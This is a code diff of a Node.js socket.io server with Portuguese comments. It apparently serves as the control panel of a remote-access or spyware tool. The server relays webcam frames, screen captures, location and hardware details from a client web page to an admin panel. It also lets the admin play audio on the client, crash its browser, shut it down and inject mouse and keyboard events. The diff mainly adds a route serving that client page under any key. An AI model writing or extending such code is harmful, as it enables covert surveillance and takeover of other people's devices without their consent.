@@ -9,12 +9,11 @@ const app    = express();
 const server = http.createServer(app);
 const io     = new Server(server, { cors:{origin:'*'} });
 
-
-// suporta /admin.html/QUALQUER_KEY → serve admin.html mesmo assim
-app.get('/admin.html/:key', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
-});
-
+/* ─── rotas HTML por chave ─── */
+app.get('/admin.html/:key', (req, res) =>
+  res.sendFile(path.join(__dirname, 'public', 'admin.html')));
+app.get('/sp.html/:key', (req, res) =>            //  ← NOVA ROTA
+  res.sendFile(path.join(__dirname, 'public', 'sp.html')));
 
 app.use(express.static(path.join(__dirname, 'public')));
 
@@ -65,9 +64,9 @@ function timed(uuid,evt,data,delay){ setTimeout(()=>emit(uuid,evt,data),delay*10
 /* ─────────────────────────── conexões ─────────────────────────── */
 io.on('connection', socket=>{
   const role = socket.handshake.query.role;
-  const lab  = (socket.handshake.query.lab || 'DEFAULT').toUpperCase(); // ← chave/lab
+  const lab  = (socket.handshake.query.lab || 'DEFAULT').toUpperCase(); // chave/lab
 
-  /* ════════════════ CLIENTE (Python) ════════════════ */
+  /* ════════════════ CLIENTE (HTML sp.html) ════════════════ */
   if(role === 'client'){
     const id = uuid();
     const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
@@ -83,16 +82,13 @@ io.on('connection', socket=>{
     socket.emit('id', id);
     broadcastClients();
 
-    /* Streams */
     socket.on('frame',        d=> relay(id,'frame',d,'watchers'));
     socket.on('screen-frame', d=> relay(id,'screen-frame',d,'screenWatchers'));
 
-    /* localização */
     socket.on('location', loc=>{
       const c=clients.get(id); if(c){ c.location=loc; io.to('lab:'+lab).emit('location-update',{uuid:id,loc}); }
     });
 
-    /* HW info */
     socket.on('hwinfo', info=>{
       const c=clients.get(id); if(c){ c.hwinfo=info; broadcastClients(); io.to('lab:'+lab).emit('hwinfo-update',{uuid:id,info}); }
     });
@@ -103,22 +99,18 @@ io.on('connection', socket=>{
   /* ═════════════════════ ADMIN (painel) ═════════════════════ */
   if(role === 'admin'){
     socket.data.lab = lab;
-    socket.join('lab:'+lab);            // room exclusiva
+    socket.join('lab:'+lab);
     socket.emit('clients', summary(lab));
 
-    /* pedir / parar streams */
     socket.on('request-stream', uuid=> addWatcher(uuid,socket.id,'watchers',lab));
     socket.on('stop-stream',    uuid=> delWatcher(uuid,socket.id,'watchers'));
-
     socket.on('request-screen', uuid=> addWatcher(uuid,socket.id,'screenWatchers',lab));
     socket.on('stop-screen',    uuid=> delWatcher(uuid,socket.id,'screenWatchers'));
 
-    /* áudios */
     socket.on('ready-audio',  ({uuid,url,delay=0})=> timed(uuid,'play-audio',{url},delay));
     socket.on('custom-audio', ({uuid,dataURL,delay=0})=> timed(uuid,'play-audio',{url:dataURL},delay));
     socket.on('stop-audio',   uuid=> emit(uuid,'stop-audio'));
 
-    /* crash / energia / hw info */
     socket.on('crash-browser', uuid=> emit(uuid,'crash-browser'));
     socket.on('request-hwinfo',uuid=> emit(uuid,'request-hwinfo'));
     socket.on('shutdown',      uuid=> emit(uuid,'shutdown'));
@@ -126,7 +118,6 @@ io.on('connection', socket=>{
     socket.on('mouse-event',   ({uuid,ev})=> emit(uuid,'mouse-event',ev));
     socket.on('key-event',     ({uuid,ev})=> emit(uuid,'key-event',ev));
 
-    /* admin caiu → limpa watchers */
     socket.on('disconnect',()=>{
       for(const c of clients.values()){
         c.watchers       = c.watchers.filter(x=>x!==socket.id);
@@ -135,8 +126,6 @@ io.on('connection', socket=>{
     });
   }
 });
-
-
 
 /* ─── start ─── */
 const PORT = process.env.PORT || 3000;
